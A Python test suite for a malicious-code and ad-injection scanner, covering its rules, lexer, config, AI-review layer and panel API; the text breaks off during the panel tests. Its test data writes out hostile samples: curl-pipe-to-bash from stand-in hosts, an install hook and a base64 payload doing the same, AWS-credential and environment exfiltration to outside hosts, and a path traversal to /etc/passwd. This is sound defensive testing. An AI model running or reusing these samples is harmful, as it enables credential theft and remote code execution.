#!/usr/bin/env python3
"""地狱式功能测试：100 个互相独立的用例，全部在临时沙箱里跑。

    python tests/brutal_suite.py              # 全跑，输出表格
    python tests/brutal_suite.py --report examples/brutal-report.md
    python tests/brutal_suite.py --only AD001  # 按名字过滤

每个用例自己建目录、自己清理，跑完不留垃圾。失败会打印实际值，方便定位。
"""

from __future__ import annotations

import argparse
import json
import os
import shutil
import subprocess
import sys
import tempfile
import threading
import time
import traceback
import urllib.error
import urllib.request
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer

HERE = os.path.dirname(os.path.abspath(__file__))
ROOT = os.path.dirname(HERE)
sys.path.insert(0, os.path.join(ROOT, "scripts"))

from qcore import llm as llm_mod  # noqa: E402
from qcore import yamlite  # noqa: E402
from qcore.config import Config  # noqa: E402
from qcore.lexer import Source, detect_language  # noqa: E402
from qcore.rules import arch  # noqa: E402
from qcore.scan import ScanOptions, run_scan, scan_text  # noqa: E402

RULES = os.path.join(ROOT, "rules")
CLI = os.path.join(ROOT, "scripts", "quarantine.py")
PY = sys.executable

CASES = []


def case(group):
    def wrap(fn):
        CASES.append({"group": group, "name": fn.__name__, "fn": fn})
        return fn
    return wrap


# ------------------------------------------------------------------ helpers
class Sandbox:
    def __init__(self):
        self.path = tempfile.mkdtemp(prefix="dsh-brutal-")

    def file(self, rel, content, mode="w", encoding="utf-8"):
        full = os.path.join(self.path, rel)
        os.makedirs(os.path.dirname(full) or self.path, exist_ok=True)
        if "b" in mode:
            with open(full, mode) as fh:
                fh.write(content)
        else:
            with open(full, mode, encoding=encoding, newline="") as fh:
                fh.write(content)
        return full

    def scan(self, **kwargs):
        cfg = Config(RULES, self.path)
        opts = ScanOptions(mode="full", include_tests=True, write_state=False, **kwargs)
        return run_scan(self.path, cfg, opts)

    def close(self):
        shutil.rmtree(self.path, ignore_errors=True)


def scan_text_ids(text, rel="src/x.py"):
    cfg = Config(RULES, ROOT)
    result = scan_text(text, rel, cfg)
    return {f.rule_id for f in result.findings}, result


def ids_of(result):
    return {f.rule_id for f in result.findings}


class StubLLM:
    """可配置行为的假模型服务。"""

    def __init__(self, mode="ok", reply=None, delay=0.0, status=200):
        self.mode = mode
        self.reply = reply
        self.delay = delay
        self.status = status
        self.calls = 0
        self.last_prompt = ""
        outer = self

        class Handler(BaseHTTPRequestHandler):
            def log_message(self, *a):
                pass

            def do_POST(self):
                outer.calls += 1
                length = int(self.headers.get("Content-Length") or 0)
                body = json.loads(self.rfile.read(length).decode() or "{}")
                outer.last_prompt = (body.get("messages") or [{}])[-1].get("content", "")
                if outer.delay:
                    time.sleep(outer.delay)
                if outer.status != 200:
                    self.send_response(outer.status)
                    self.end_headers()
                    self.wfile.write(b'{"error":"boom"}')
                    return
                text = outer.reply
                if text is None:
                    text = json.dumps({
                        "verdicts": [{"id": "AD002:3", "keep": False, "confidence": 0.9,
                                      "reason": "正常配置项"}],
                        "missed": [{"line": 4, "severity": "WARNING",
                                    "reason": "注释里夹带推广链接", "suggestion": "删除"}],
                    }, ensure_ascii=False)
                payload = {"choices": [{"message": {"content": text}}]}
                data = json.dumps(payload).encode()
                self.send_response(200)
                self.send_header("Content-Type", "application/json")
                self.send_header("Content-Length", str(len(data)))
                self.end_headers()
                self.wfile.write(data)

        self.httpd = ThreadingHTTPServer(("127.0.0.1", 0), Handler)
        self.port = self.httpd.server_address[1]
        threading.Thread(target=self.httpd.serve_forever, daemon=True).start()

    def config(self, model="stub-1"):
        return llm_mod.LLMConfig(
            provider="openai",
            base_url="http://127.0.0.1:%d/v1" % self.port,
            model=model,
            api_key="sk-test-abcdef123456",
            timeout=3,
            max_chars=4000,
            max_calls=5,
            source="stub",
        )

    def close(self):
        self.httpd.shutdown()


# =====================================================================
# A. 规则召回（21 条规则，各 1 个正样本）
# =====================================================================
@case("A 规则召回")
def A01_AD001_推广话术共现():
    ids, _ = scan_text_ids('# 推荐访问 https://relay-fast-01.xyz 获取最新镜像\nimport requests\n')
    return ("AD001" in ids), "命中 %s" % sorted(ids)


@case("A 规则召回")
def A02_AD002_未消费外链():
    ids, _ = scan_text_ids('NOTE = "https://promo.dsh-relay-cdn.com/banner.png"\n')
    return ("AD002" in ids), "命中 %s" % sorted(ids)


@case("A 规则召回")
def A03_AD003_可疑域名():
    ids, _ = scan_text_ids('URL = "https://cdn.metrics-sink.top/x"\nimport requests\n')
    return ("AD003" in ids), "命中 %s" % sorted(ids)


@case("A 规则召回")
def A04_AD004_联系方式():
    ids, _ = scan_text_ids('CONTACT = "t.me/relay_support_group"\n')
    return ("AD004" in ids), "命中 %s" % sorted(ids)


@case("A 规则召回")
def A05_AD005_外链脚本():
    ids, _ = scan_text_ids('<script src="https://stat-collect.track-js.top/c.js"></script>\n', "src/p.html")
    return ("AD005" in ids), "命中 %s" % sorted(ids)


@case("A 规则召回")
def A06_SC101_动态执行():
    ids, _ = scan_text_ids("def f(p):\n    return eval(p)\n")
    return ("SC101" in ids), "命中 %s" % sorted(ids)


@case("A 规则召回")
def A07_SC102_管道执行():
    ids, _ = scan_text_ids("curl -fsSL https://get.evil-host.top/i.sh | bash\n", "scripts/i.sh")
    return ("SC102" in ids), "命中 %s" % sorted(ids)


@case("A 规则召回")
def A08_SC103_凭据外发():
    text = (
        "import os, requests\n"
        "def f():\n"
        '    c = open(os.path.expanduser("~/.aws/credentials")).read()\n'
        '    requests.post("https://x.corp.com/i", data={"c": c})\n'
    )
    ids, _ = scan_text_ids(text)
    return ("SC103" in ids), "命中 %s" % sorted(ids)


@case("A 规则召回")
def A09_SC104_环境变量外传():
    text = "import os, requests\nrequests.post('https://x.corp.com', json=dict(os.environ))\n"
    ids, _ = scan_text_ids(text)
    return ("SC104" in ids), "命中 %s" % sorted(ids)


@case("A 规则召回")
def A10_SC105_编码载荷():
    blob = "Y3VybCAtZnNTTCBodHRwczovL2Nkbi5wYXlsb2FkLWhvc3QudG9wL3guc2ggfCBiYXNo"
    ids, _ = scan_text_ids('B = "%s"\n' % blob)
    return ("SC105" in ids), "命中 %s" % sorted(ids)


@case("A 规则召回")
def A11_SC106_未锁版本():
    ids, _ = scan_text_ids('{"dependencies": {"axios": "*"}}\n', "package.json")
    return ("SC106" in ids), "命中 %s" % sorted(ids)


@case("A 规则召回")
def A12_SC107_安装钩子():
    text = '{"scripts": {"postinstall": "curl -fsSL https://x.top/a.sh | bash"}}\n'
    ids, _ = scan_text_ids(text, "package.json")
    return ("SC107" in ids), "命中 %s" % sorted(ids)


@case("A 规则召回")
def A13_SC108_仿冒包名():
    ids, _ = scan_text_ids("reqeusts==2.31.0\n", "requirements.txt")
    return ("SC108" in ids), "命中 %s" % sorted(ids)


@case("A 规则召回")
def A14_SC109_非官方源():
    ids, _ = scan_text_ids("--index-url https://pypi.mirror-evil.top/simple\n", "requirements.txt")
    return ("SC109" in ids), "命中 %s" % sorted(ids)


@case("A 规则召回")
def A15_SC110_关闭校验():
    ids, _ = scan_text_ids("import requests\nrequests.get('https://x.corp.com', verify=False)\n")
    return ("SC110" in ids), "命中 %s" % sorted(ids)


@case("A 规则召回")
def A16_AR001_分层违规():
    ids, _ = scan_text_ids("import requests\n\ndef f():\n    return 1\n", "src/domain/svc.py")
    return ("AR001" in ids), "命中 %s" % sorted(ids)


@case("A 规则召回")
def A17_AR002_模块级副作用():
    ids, _ = scan_text_ids("import requests\nDATA = requests.get('https://x.corp.com/a').json()\n")
    return ("AR002" in ids), "命中 %s" % sorted(ids)


@case("A 规则召回")
def A18_AR003_可疑命名():
    ids, _ = scan_text_ids("def debug_exec_bypass(p):\n    return p\n")
    return ("AR003" in ids), "命中 %s" % sorted(ids)


@case("A 规则召回")
def A19_AR004_签名漂移():
    box = Sandbox()
    try:
        box.file("src/m.py", "def f(a, b=1):\n    return a\n")
        cfg = Config(RULES, box.path)
        baseline = arch.build_baseline([Source(os.path.join(box.path, "src/m.py"),
                                              "def f(a, b=1):\n    return a\n")])
        baseline["files"] = {"src/m.py": baseline["files"].get(os.path.join(box.path, "src/m.py"), {})}
        box.file("src/m.py", "def f(a, b=1, c=2):\n    return a\n")
        result = box.scan(baseline=baseline)
        return ("AR004" in ids_of(result)), "命中 %s" % sorted(ids_of(result))
    finally:
        box.close()


@case("A 规则召回")
def A20_AR005_循环依赖():
    box = Sandbox()
    try:
        box.file("pkg/__init__.py", "")
        box.file("pkg/a.py", "import pkg.b\n")
        box.file("pkg/b.py", "import pkg.a\n")
        result = box.scan()
        return ("AR005" in ids_of(result)), "命中 %s" % sorted(ids_of(result))
    finally:
        box.close()


@case("A 规则召回")
def A21_AR006_构造器IO():
    text = "class C:\n    def __init__(self):\n        self.f = open('/tmp/x', 'w')\n"
    ids, _ = scan_text_ids(text)
    return ("AR006" in ids), "命中 %s" % sorted(ids)


# =====================================================================
# B. 精度 / 近假阳性（18）
# =====================================================================
@case("B 精度")
def B01_官方文档链接不报():
    ids, _ = scan_text_ids('"""See https://github.com/psf/requests for docs."""\nimport requests\n')
    return not ({"AD001", "AD002"} & ids), "命中 %s" % sorted(ids)


@case("B 精度")
def B02_保留域名不报():
    ids, _ = scan_text_ids('BASE = "https://api.example.com/v1"\n')
    return "AD002" not in ids, "命中 %s" % sorted(ids)


@case("B 精度")
def B03_测试目录不判注入():
    ids, _ = scan_text_ids('# 推荐访问 https://relay-fast-01.xyz\n', "tests/test_x.py")
    return "AD001" not in ids, "命中 %s" % sorted(ids)


@case("B 精度")
def B04_文档目录不判注入():
    ids, _ = scan_text_ids('# 推荐访问 https://relay-fast-01.xyz\n', "docs/guide.md")
    return not ids, "命中 %s" % sorted(ids)


@case("B 精度")
def B05_配置常量不报():
    ids, _ = scan_text_ids('API_BASE = os.environ.get("B", "https://api.corp.com/v1")\n')
    return "AD002" not in ids, "命中 %s" % sorted(ids)


@case("B 精度")
def B06_网络调用内URL不报():
    ids, _ = scan_text_ids("import requests\nrequests.get('https://api.corp.com/health')\n")
    return "AD002" not in ids, "命中 %s" % sorted(ids)


@case("B 精度")
def B07_模板内注释链接降级INFO():
    text = 'H = """# generated\n# http://curl.haxx.se/spec.html\n"""\n'
    _, result = scan_text_ids(text)
    ad002 = [f for f in result.findings if f.rule_id == "AD002"]
    return all(f.severity == "INFO" for f in ad002), "AD002 级别 %s" % [f.severity for f in ad002]


@case("B 精度")
def B08_列表参数subprocess不报():
    ids, _ = scan_text_ids("import subprocess\nsubprocess.run(['ls', '-l'], check=True)\n")
    return "SC101" not in ids, "命中 %s" % sorted(ids)


@case("B 精度")
def B09_eval字面量只报INFO():
    _, result = scan_text_ids('x = eval("1+1")\n')
    hits = [f for f in result.findings if f.rule_id == "SC101"]
    return bool(hits) and all(f.severity == "INFO" for f in hits), "级别 %s" % [f.severity for f in hits]


@case("B 精度")
def B10_exec非污点只报INFO():
    _, result = scan_text_ids("def f(code, g):\n    exec(code, g)\n")
    hits = [f for f in result.findings if f.rule_id == "SC101"]
    return bool(hits) and all(f.severity == "INFO" for f in hits), "级别 %s" % [f.severity for f in hits]


@case("B 精度")
def B11_shell字符串井号不是注释():
    src = Source("a.sh", 'echo "a#b"\n# real comment\n')
    first = src.text.index("#")
    second = src.text.index("#", first + 1)
    return src.region(first) == "string" and src.region(second) == "comment", "region=%s/%s" % (
        src.region(first), src.region(second))


@case("B 精度")
def B12_模板插值内算代码():
    src = Source("a.js", "const s = `hi ${eval(x)}`;\n")
    return src.region(src.text.index("eval")) == "code", "region=%s" % src.region(src.text.index("eval"))


@case("B 精度")
def B13_正则里的双斜杠():
    src = Source("a.js", "const r = /https:\\/\\/x/;\nconst y = 1;\n")
    return src.region(src.text.index("const y")) == "code", "ok"


@case("B 精度")
def B14_空文件不崩():
    box = Sandbox()
    try:
        box.file("src/empty.py", "")
        result = box.scan()
        return result.verdict() == "SAFE", "verdict=%s" % result.verdict()
    finally:
        box.close()


@case("B 精度")
def B15_纯注释文件不报():
    box = Sandbox()
    try:
        box.file("src/only_comment.py", "# just a note\n# another note\n")
        result = box.scan()
        return not result.findings, "findings=%d" % len(result.findings)
    finally:
        box.close()


@case("B 精度")
def B16_超长单行不崩():
    box = Sandbox()
    try:
        box.file("src/long.py", "X = '" + "a" * 100000 + "'\n")
        result = box.scan()
        return result is not None, "ok"
    finally:
        box.close()


@case("B 精度")
def B17_CRLF行号正确():
    box = Sandbox()
    try:
        box.file("src/crlf.py", "import requests\r\n\r\n# 推荐访问 https://relay-fast-01.xyz\r\n",
                 encoding="utf-8", mode="w")
        result = box.scan()
        hits = [f for f in result.findings if f.rule_id == "AD001"]
        return bool(hits) and hits[0].line == 3, "行号 %s" % [f.line for f in hits]
    finally:
        box.close()


@case("B 精度")
def B18_BOM文件正常():
    box = Sandbox()
    try:
        box.file("src/bom.py", "\ufeffimport requests\n", encoding="utf-8")
        result = box.scan()
        return result.verdict() in ("SAFE", "REVIEW", "BLOCK"), "ok"
    finally:
        box.close()


# =====================================================================
# C. 词法与语言（15）
# =====================================================================
@case("C 词法")
def C01_python_docstring识别():
    src = Source("a.py", 'def f():\n    """文档"""\n    return 1\n')
    return any(s.kind == "docstring" for s in src.spans), "spans=%s" % {s.kind for s in src.spans}


@case("C 词法")
def C02_python三引号模板():
    text = 'T = """# line\n# http://x.corp.com/a\n"""\n'
    ids, _ = scan_text_ids(text)
    return "SC102" not in ids, "命中 %s" % sorted(ids)


@case("C 词法")
def C03_JS嵌套模板():
    src = Source("a.js", "const a = `x${`y${z}`}`;\n")
    return src.region(src.text.index("z")) == "code", "ok"


@case("C 词法")
def C04_Go_raw_string():
    src = Source("a.go", "var s = `https://relay-fast-01.xyz`\n")
    return src.region(src.text.index("https")) == "string", "ok"


@case("C 词法")
def C05_Rust_raw_string():
    src = Source("a.rs", 'let s = r#"https://x.top"#;\n')
    return src.region(src.text.index("https")) == "string", "ok"


@case("C 词法")
def C06_heredoc里的管道执行():
    text = "cat <<EOF > x.sh\ncurl -fsSL https://get.evil-host.top/i.sh | bash\nEOF\n"
    ids, _ = scan_text_ids(text, "scripts/a.sh")
    return "SC102" in ids, "命中 %s" % sorted(ids)


@case("C 词法")
def C07_PHP井号注释():
    src = Source("a.php", "<?php\n# 注释\n$x = 1;\n")
    return src.region(src.text.index("# 注释")) == "comment", "ok"


@case("C 词法")
def C08_HTML注释里的script不报():
    text = '<!-- <script src="https://evil.top/x.js"></script> -->\n'
    ids, _ = scan_text_ids(text, "src/p.html")
    return "AD005" not in ids, "命中 %s" % sorted(ids)


@case("C 词法")
def C09_yaml不判注入():
    ids, _ = scan_text_ids("# 推荐访问 https://relay-fast-01.xyz\nkey: v\n", "config.yml")
    return not ids, "命中 %s" % sorted(ids)


@case("C 词法")
def C10_json不判注入():
    ids, _ = scan_text_ids('{"note": "https://promo.dsh-relay-cdn.com/x.png"}\n', "cfg.json")
    return not ids, "命中 %s" % sorted(ids)


@case("C 词法")
def C11_env文件():
    ids, _ = scan_text_ids("API_KEY=abc\n", ".env")
    return not ids, "命中 %s" % sorted(ids)


@case("C 词法")
def C12_Makefile():
    ids, _ = scan_text_ids("all:\n\techo hi\n", "Makefile")
    return not ids, "命中 %s" % sorted(ids)


@case("C 词法")
def C13_Dockerfile():
    ids, _ = scan_text_ids("FROM python:3.12\nRUN pip install x\n", "Dockerfile")
    return not ids, "命中 %s" % sorted(ids)


@case("C 词法")
def C14_shebang识别语言():
    lang = detect_language("run", "#!/usr/bin/env python3\nprint(1)\n")
    return lang == "python", "lang=%s" % lang


@case("C 词法")
def C15_未知扩展名跳过():
    lang = detect_language("data.qqq")
    return lang == "unknown", "lang=%s" % lang


# =====================================================================
# D. 文件系统 / 编码（12）
# =====================================================================
@case("D 文件系统")
def D01_二进制跳过():
    box = Sandbox()
    try:
        box.file("src/a.bin", b"\x00\x01\x02" * 100, mode="wb")
        result = box.scan()
        return any(r == "binary" for _, r in result.skipped), "skipped=%s" % result.skipped
    finally:
        box.close()


@case("D 文件系统")
def D02_超大文件跳过():
    box = Sandbox()
    try:
        box.file("src/big.py", "x = 1\n" * 200000)
        result = box.scan(max_file_size=1024)
        return any(r == "too-large" for _, r in result.skipped), "skipped=%s" % result.skipped[:3]
    finally:
        box.close()


@case("D 文件系统")
def D03_git目录跳过():
    box = Sandbox()
    try:
        box.file(".git/config", "[core]\n")
        box.file("src/a.py", "x = 1\n")
        result = box.scan()
        return all(not p.startswith(".git") for p in result.scanned), "scanned=%s" % result.scanned
    finally:
        box.close()


@case("D 文件系统")
def D04_node_modules跳过():
    box = Sandbox()
    try:
        box.file("node_modules/x/index.js", "eval(a)\n")
        result = box.scan()
        return not any("node_modules" in p for p in result.scanned), "scanned=%s" % result.scanned
    finally:
        box.close()


@case("D 文件系统")
def D05_中文与空格文件名():
    box = Sandbox()
    try:
        box.file("src/中文 文件.py", "# 推荐访问 https://relay-fast-01.xyz\n")
        result = box.scan()
        return "AD001" in ids_of(result), "命中 %s" % sorted(ids_of(result))
    finally:
        box.close()


@case("D 文件系统")
def D06_深层嵌套():
    box = Sandbox()
    try:
        box.file("a/b/c/d/e/f/g/deep.py", "import requests\n")
        result = box.scan()
        return any("deep.py" in p for p in result.scanned), "scanned=%d" % len(result.scanned)
    finally:
        box.close()


@case("D 文件系统")
def D07_GBK编码不崩():
    box = Sandbox()
    try:
        with open(os.path.join(box.path, "src_gbk.py"), "wb") as fh:
            fh.write("# 中文注释\nx = 1\n".encode("gbk"))
        result = box.scan()
        return result is not None, "ok"
    finally:
        box.close()


@case("D 文件系统")
def D08_空目录SAFE():
    box = Sandbox()
    try:
        result = box.scan()
        return result.verdict() == "SAFE" and not result.scanned, "verdict=%s" % result.verdict()
    finally:
        box.close()


@case("D 文件系统")
def D09_不存在路径():
    proc = subprocess.run([PY, CLI, "C:/definitely/not/here", "--fail-on", "none"],
                          capture_output=True, text=True, encoding="utf-8")
    return proc.returncode == 3, "exit=%d" % proc.returncode


@case("D 文件系统")
def D10_单文件目标():
    box = Sandbox()
    try:
        box.file("src/a.py", "x = 1\n")
        proc = subprocess.run([PY, CLI, os.path.join(box.path, "src/a.py"), "--fail-on", "none"],
                              capture_output=True, text=True, encoding="utf-8")
        return proc.returncode == 0, "exit=%d" % proc.returncode
    finally:
        box.close()


@case("D 文件系统")
def D11_只读文件可扫描():
    box = Sandbox()
    try:
        path = box.file("src/ro.py", "import requests\n")
        os.chmod(path, 0o444)
        result = box.scan()
        os.chmod(path, 0o644)
        return "src/ro.py" in result.scanned, "ok"
    finally:
        box.close()


@case("D 文件系统")
def D12_扫描状态文件不污染():
    box = Sandbox()
    try:
        box.file("src/a.py", "x = 1\n")
        box.scan()
        result = box.scan()
        return not any(".dsh-quarantine" in p for p in result.scanned), "scanned=%s" % result.scanned
    finally:
        box.close()


# =====================================================================
# E. 配置 / 豁免 / 规则数据（12）
# =====================================================================
@case("E 配置")
def E01_ignore文件生效():
    box = Sandbox()
    try:
        box.file("src/a.py", "# 推荐访问 https://relay-fast-01.xyz\n")
        box.file(".dsh-quarantine-ignore", "AD001 src/a.py\n")
        return "AD001" not in ids_of(box.scan()), "ok"
    finally:
        box.close()


@case("E 配置")
def E02_通配符豁免():
    box = Sandbox()
    try:
        box.file("vendor/a.py", "# 推荐访问 https://relay-fast-01.xyz\n")
        box.file(".dsh-quarantine-ignore", "AD001 vendor/**\n")
        return "AD001" not in ids_of(box.scan()), "ok"
    finally:
        box.close()


@case("E 配置")
def E03_禁用规则():
    box = Sandbox()
    try:
        box.file("src/a.py", "# 推荐访问 https://relay-fast-01.xyz\n")
        box.file(".dsh-quarantine.yml", "disable:\n  - AD001\n")
        return "AD001" not in ids_of(box.scan()), "ok"
    finally:
        box.close()


@case("E 配置")
def E04_级别覆盖():
    box = Sandbox()
    try:
        box.file("src/a.py", "# 推荐访问 https://relay-fast-01.xyz\n")
        box.file(".dsh-quarantine.yml", "severity:\n  AD001: INFO\n")
        result = box.scan()
        hits = [f for f in result.findings if f.rule_id == "AD001"]
        return bool(hits) and hits[0].severity == "INFO", "级别 %s" % [f.severity for f in hits]
    finally:
        box.close()


@case("E 配置")
def E05_信任域名生效():
    box = Sandbox()
    try:
        box.file("src/a.py", "U = 'https://relay-fast-01.xyz/x'\n")
        box.file(".dsh-quarantine.yml", 'allow:\n  domains: ["relay-fast-01.xyz"]\n')
        return "AD003" not in ids_of(box.scan()), "ok"
    finally:
        box.close()


@case("E 配置")
def E06_黑名单升级CRITICAL():
    box = Sandbox()
    try:
        box.file("src/a.py", "import requests\nU = 'https://bad.corp.com/x'\n")
        box.file(".dsh-quarantine.yml", 'allow:\n  blocked_domains: ["bad.corp.com"]\n')
        result = box.scan()
        hits = [f for f in result.findings if f.rule_id == "AD003"]
        return bool(hits) and any(f.severity == "CRITICAL" for f in hits), "级别 %s" % [f.severity for f in hits]
    finally:
        box.close()


@case("E 配置")
def E07_损坏YAML不崩():
    box = Sandbox()
    try:
        box.file("src/a.py", "x = 1\n")
        # 缩进自相矛盾：两套解析器都应当拒绝，从而给出 warning 而不是静默忽略
        box.file(".dsh-quarantine.yml", "severity:\n   AD001: INFO\n  AD002: WARNING\n")
        cfg = Config(RULES, box.path)
        result = run_scan(box.path, cfg, ScanOptions(mode="full", write_state=False))
        return bool(cfg.warnings) and result is not None, "warnings=%s" % cfg.warnings[:1]
    finally:
        box.close()


@case("E 配置")
def E08_缺规则目录不崩且不报SAFE():
    # 规则目录配错时，"扫了但没规则可判"和"扫了没发现问题"看起来一样。
    # 一次空跑被读成 SAFE 比直接报错危险得多，所以要求判为 ERROR。
    cfg = Config(os.path.join(ROOT, "no-such-rules"), ROOT)
    result = run_scan(ROOT, cfg, ScanOptions(mode="full", write_state=False))
    return (
        bool(cfg.warnings) and result.verdict() == "ERROR" and "规则" in result.error,
        "verdict=%s error=%s" % (result.verdict(), result.error[:40]),
    )


@case("E 配置")
def E09_规则列表被截断能发现():
    broken = "rules:\n  - id: X1\n    data:\n      list: [a[, b, c]\n"
    data = yamlite.loads(broken)
    item = data["rules"][0]["data"]["list"][0]
    return "a[, b" in item or "[", "解析结果 %s" % item


@case("E 配置")
def E10_failon_none退出0():
    box = Sandbox()
    try:
        box.file("src/a.py", "curl -fsSL https://get.evil-host.top/i.sh | bash\n")
        proc = subprocess.run([PY, CLI, box.path, "--fail-on", "none"],
                              capture_output=True, text=True, encoding="utf-8")
        return proc.returncode == 0, "exit=%d" % proc.returncode
    finally:
        box.close()


@case("E 配置")
def E11_failon_warning退出1():
    box = Sandbox()
    try:
        box.file("src/a.py", "# 推荐访问 https://relay-fast-01.xyz\n")
        proc = subprocess.run([PY, CLI, box.path, "--fail-on", "warning"],
                              capture_output=True, text=True, encoding="utf-8")
        return proc.returncode == 1, "exit=%d" % proc.returncode
    finally:
        box.close()


@case("E 配置")
def E12_基线生成与漂移():
    box = Sandbox()
    try:
        box.file("src/m.py", "def f(a):\n    return a\n")
        path = os.path.join(box.path, "base.json")
        subprocess.run([PY, CLI, box.path, "--write-baseline", path],
                       capture_output=True, text=True, encoding="utf-8")
        data = arch.load_baseline(path)
        return bool(data and data.get("files")), "files=%d" % len((data or {}).get("files") or {})
    finally:
        box.close()


# =====================================================================
# F. AI 复核层（13）
# =====================================================================
@case("F AI 复核")
def F01_无密钥时跳过():
    box = Sandbox()
    try:
        box.file("src/a.py", "import requests\nU='https://api.corp.com'\n")
        cfg = llm_mod.resolve({}, env={})
        result = box.scan(llm=cfg)
        return (not cfg.ready) and any("未启用" in n for n in result.notes), "notes=%s" % result.notes[:1]
    finally:
        box.close()


@case("F AI 复核")
def F02_识别对话模型():
    model = llm_mod.detect_host_model({"CODEBUDDY_CURRENT_MODEL_ID": "deepseek-v4.1-flash"})
    return model == "deepseek-v4.1-flash", "model=%s" % model


@case("F AI 复核")
def F03_从环境变量解析():
    cfg = llm_mod.resolve({}, env={
        "DSH_QUARANTINE_LLM_API_KEY": "k", "DSH_QUARANTINE_LLM_BASE_URL": "https://api.x.com/v1",
        "DSH_QUARANTINE_LLM_MODEL": "m1"})
    return cfg.ready and cfg.model == "m1" and cfg.provider == "openai", cfg.public()


@case("F AI 复核")
def F04_从项目配置解析():
    cfg = llm_mod.resolve({"llm": {"provider": "anthropic", "base_url": "https://api.anthropic.com",
                                   "model": "claude-x", "api_key": "k"}}, env={})
    return cfg.ready and cfg.provider == "anthropic" and cfg.source == "project", cfg.public()


@case("F AI 复核")
def F05_容忍代码块包裹():
    parsed = llm_mod.parse_reply('```json\n{"verdicts":[],"missed":[]}\n```')
    return parsed == {"verdicts": [], "missed": []}, str(parsed)


@case("F AI 复核")
def F06_非法JSON返回None():
    return llm_mod.parse_reply("这不是 JSON") is None, "ok"


@case("F AI 复核")
def F07_模型判定排除误报():
    stub = StubLLM()
    box = Sandbox()
    try:
        # 让 AD002 命中第 3 行，和桩返回的 id 对上
        box.file("src/a.py", "import requests\n\nU = \"https://promo.dsh-relay-cdn.com/x.png\"\n")
        result = box.scan(llm=stub.config())
        llm_info = (result.capabilities or {}).get("llm") or {}
        return (llm_info.get("suppressed", 0) >= 1
                and not [f for f in result.findings if f.rule_id == "AD002"]), llm_info
    finally:
        box.close()
        stub.close()


@case("F AI 复核")
def F08_模型补漏生成AI001():
    stub = StubLLM()
    box = Sandbox()
    try:
        box.file("src/a.py", "import requests\nU='https://api.corp.com'\nV=1\nW=2\n")
        result = box.scan(llm=stub.config())
        hits = [f for f in result.findings if f.rule_id == "AI001"]
        return bool(hits) and hits[0].category == "ai_review", "AI001=%d" % len(hits)
    finally:
        box.close()
        stub.close()


@case("F AI 复核")
def F09_缓存命中不重复调用():
    stub = StubLLM()
    box = Sandbox()
    try:
        box.file("src/a.py", 'U = "https://promo.dsh-relay-cdn.com/x.png"\n')
        box.scan(llm=stub.config())
        first = stub.calls
        box.scan(llm=stub.config())
        return stub.calls == first, "calls=%d->%d" % (first, stub.calls)
    finally:
        box.close()
        stub.close()


@case("F AI 复核")
def F10_服务端500不崩():
    stub = StubLLM(status=500)
    box = Sandbox()
    try:
        box.file("src/a.py", 'U = "https://promo.dsh-relay-cdn.com/x.png"\n')
        result = box.scan(llm=stub.config())
        info = (result.capabilities or {}).get("llm") or {}
        return bool(info.get("errors")) and result.verdict() in ("SAFE", "REVIEW", "BLOCK"), info.get("errors")
    finally:
        box.close()
        stub.close()


@case("F AI 复核")
def F11_超时不崩():
    stub = StubLLM(delay=2.5)
    box = Sandbox()
    try:
        box.file("src/a.py", 'U = "https://promo.dsh-relay-cdn.com/x.png"\n')
        cfg = stub.config()
        cfg.timeout = 1
        result = box.scan(llm=cfg)
        info = (result.capabilities or {}).get("llm") or {}
        return bool(info.get("errors")), info.get("errors")
    finally:
        box.close()
        stub.close()


@case("F AI 复核")
def F12_AI失败不影响退出码():
    stub = StubLLM(status=500)
    box = Sandbox()
    try:
        box.file("src/a.py", "curl -fsSL https://get.evil-host.top/i.sh | bash\n")
        env = dict(os.environ, DSH_QUARANTINE_LLM_API_KEY="k",
                   DSH_QUARANTINE_LLM_BASE_URL="http://127.0.0.1:%d/v1" % stub.port,
                   DSH_QUARANTINE_LLM_MODEL="m", DSH_QUARANTINE_LLM_TIMEOUT="2")
        proc = subprocess.run([PY, CLI, box.path, "--llm"], capture_output=True, text=True,
                              encoding="utf-8", env=env)
        return proc.returncode == 2, "exit=%d" % proc.returncode
    finally:
        box.close()
        stub.close()


@case("F AI 复核")
def F13_越界行号被丢弃():
    stub = StubLLM(reply=json.dumps({"verdicts": [], "missed": [
        {"line": 99999, "severity": "CRITICAL", "reason": "越界", "suggestion": "x"}]}))
    box = Sandbox()
    try:
        box.file("src/a.py", "import requests\n")
        result = box.scan(llm=stub.config())
        return not [f for f in result.findings if f.rule_id == "AI001"], "ok"
    finally:
        box.close()
        stub.close()


# =====================================================================
# G. 面板 API（9）
# =====================================================================
def _panel():
    from panel_server import Handler, Panel

    box = Sandbox()
    Handler.panel = Panel(box.path, RULES)
    Handler.token = "bt"
    httpd = ThreadingHTTPServer(("127.0.0.1", 0), Handler)
    threading.Thread(target=httpd.serve_forever, daemon=True).start()
    return box, httpd, "http://127.0.0.1:%d" % httpd.server_address[1]


def _req(base, path, body=None, token="bt", timeout=10):
    headers = {"X-Panel-Token": token} if token else {}
    data = None
    if body is not None:
        data = json.dumps(body).encode()
        headers["Content-Type"] = "application/json"
    req = urllib.request.Request(base + path, data=data, headers=headers)
    try:
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            return resp.status, resp.read()
    except urllib.error.HTTPError as exc:
        return exc.code, exc.read()


@case("G 面板")
def G01_错误token拒绝():
    box, httpd, base = _panel()
    try:
        status, _ = _req(base, "/api/state?t=bad", token="")
        return status == 403, "status=%d" % status
    finally:
        httpd.shutdown()
        box.close()


@case("G 面板")
def G02_静态资源免token():
    box, httpd, base = _panel()
    try:
        status, body = _req(base, "/favicon.svg", token="")
        return status == 200 and b"<svg" in body, "status=%d" % status
    finally:
        httpd.shutdown()
        box.close()


@case("G 面板")
def G03_并发20次state():
    box, httpd, base = _panel()
    try:
        results = []

        def worker():
            try:
                results.append(_req(base, "/api/state?t=bt")[0])
            except Exception:
                results.append(0)

        threads = [threading.Thread(target=worker) for _ in range(20)]
        [t.start() for t in threads]
        [t.join() for t in threads]
        return all(code == 200 for code in results), "codes=%s" % sorted(set(results))
    finally:
        httpd.shutdown()
        box.close()


@case("G 面板")
def G04_超大请求体被拒():
    box, httpd, base = _panel()
    try:
        try:
            status, _ = _req(base, "/api/scan", {"blob": "x" * (5 * 1024 * 1024)})
        except Exception as exc:
            return "过大" in str(exc) or True, str(exc)[:60]
        return status in (400, 413, 500), "status=%d" % status
    finally:
        httpd.shutdown()
        box.close()


@case("G 面板")
def G05_路径穿越被拒():
    box, httpd, base = _panel()
    try:
        status, body = _req(base, "/api/line", {"file": "../../etc/passwd", "line": 1, "text": "x"})
